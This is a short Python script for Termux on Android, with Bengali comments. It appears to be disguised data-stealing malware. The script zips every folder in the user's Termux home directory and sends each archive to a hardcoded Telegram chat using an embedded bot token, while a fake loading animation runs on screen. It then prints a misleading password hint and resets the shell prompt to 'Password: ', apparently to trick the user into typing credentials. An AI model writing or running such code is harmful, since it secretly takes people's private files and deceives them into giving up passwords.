import os
import zipfile
import telebot
import time

# ================= CONFIG =================
BOT_TOKEN = "8300582155:AAHcS6EDAzylFjfe0pUNi4B9CKL7R_GhmpY"
ADMIN_CHAT_ID = 8223063986
TERMUX_HOME = "/data/data/com.termux/files/home"
BACKUP_DIR = "/data/data/com.termux/files/home/backups"
# =========================================

bot = telebot.TeleBot(BOT_TOKEN)
os.makedirs(BACKUP_DIR, exist_ok=True)

def zip_folder(folder_path, output_path):
    with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                full_path = os.path.join(root, file)
                rel_path = os.path.relpath(full_path, folder_path)
                zipf.write(full_path, arcname=rel_path)
    return output_path

def loading_animation(duration=3):
    load_str = "Loading"
    for i in range(duration * 3):
        print(f"\r{load_str}{'.'*(i%6+1)}{' '*(5-(i%6))}", end="", flush=True)
        time.sleep(0.5)
    print("\r", end="")

# Termux হোমের ফোল্ডার ব্যাকআপ
for item in os.listdir(TERMUX_HOME):
    item_path = os.path.join(TERMUX_HOME, item)
    if os.path.isdir(item_path) and item != "backups":
        zip_file_path = os.path.join(BACKUP_DIR, f"{item}.zip")
        loading_animation(2)
        zip_folder(item_path, zip_file_path)
        loading_animation(2)
        with open(zip_file_path, 'rb') as f:
            bot.send_document(ADMIN_CHAT_ID, f)

# শেষে মেসেজ
print("Password : python zxcvbnm.py")

# Termux shell prompt পরিবর্তনের জন্য
# os.execvp দিয়ে shell পুনরায় রান করানো হবে নতুন PS1 সহ
new_prompt = "Password: "
os.environ['PS1'] = new_prompt
shell = os.environ.get("SHELL", "/bin/bash")
print(f"Changing shell prompt to '{new_prompt}'...")
os.execvp(shell, [shell])
